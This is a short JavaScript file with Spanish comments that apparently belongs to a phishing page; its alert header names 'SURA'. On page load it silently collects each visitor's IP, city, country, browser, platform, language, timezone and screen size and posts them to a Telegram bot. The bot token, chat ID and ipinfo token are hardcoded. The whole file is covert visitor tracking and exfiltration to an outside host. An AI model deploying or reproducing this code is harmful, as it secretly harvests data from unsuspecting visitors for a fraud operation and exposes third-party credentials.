// Función para obtener información del usuario
async function getUserDetails() {
    // Primero, obtenemos la información básica del navegador y la página
    const info = {
        timestamp: new Date().toLocaleString(), // Fecha y hora local
        element: "Página cargada", // Indicamos que la página ha sido cargada
        id: "N/A", // No aplica un ID
        classList: "N/A", // No aplica clases CSS

        // Información del dispositivo y navegador
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // Zona horaria
        screenResolution: `${window.screen.width}x${window.screen.height}`, // Resolución de pantalla
        windowSize: `${window.innerWidth}x${window.innerHeight}`, // Tamaño de la ventana
    };

    // Obtener la IP, ciudad y país del usuario a través de ipinfo.io
    const geoData = await fetch('https://ipinfo.io/json?token=3798a6699b4912') // Sustituye YOUR_TOKEN por tu token de ipinfo.io
        .then(response => response.json())
        .then(data => ({
            ip: data.ip,
            city: data.city,      // Ciudad
            country: data.country // País
        }))
        .catch(error => {
            console.error('Error obteniendo la IP, ciudad y el país:', error);
            return { ip: 'Desconocida', city: 'Desconocida', country: 'Desconocido' }; // Valores por defecto en caso de error
        });

    // Añadimos la IP, ciudad y el país a la información
    info.ip = geoData.ip;
    info.city = geoData.city;
    info.country = geoData.country;

    return info;
}

// Función para enviar la información al bot de Telegram
async function sendToTelegram(data) {
    const BOT_TOKEN = "7682731893:AAE1hRu8wI0ENOIGEfHZhjQxugIfqpLshWs"; // Reemplaza con el token de tu bot
    const CHAT_ID = "5848946481"; // Reemplaza con el chat ID

    const message = `🚨SURA - BUENO - CEL 🚨  
    🌍 Información geográfica:
- IP: ${data.ip}
- Ciudad: ${data.city}
- País: ${data.country}

- Fecha y hora: ${data.timestamp}
- Elemento clicado: ${data.element}
- ID del elemento: ${data.id}
- Clases CSS: ${data.classList}

💻 Información del dispositivo:
- Navegador: ${data.userAgent}
- Plataforma: ${data.platform}
- Idioma: ${data.language}
- Zona Horaria: ${data.timezone}
- Resolución de pantalla: ${data.screenResolution}
- Tamaño de ventana: ${data.windowSize}


    `.trim();

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: CHAT_ID,
        text: message,
    };

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error(`Error: ${response.statusText}`);
        }
        console.log("Mensaje enviado a Telegram con éxito.");
    } catch (error) {
        console.error("Error:", error);
    }
}

// Ejecutar solo cuando la página se haya cargado
window.onload = function() {
    getUserDetails().then(userDetails => {
        sendToTelegram(userDetails); // Enviar la información al bot de Telegram
    });
};
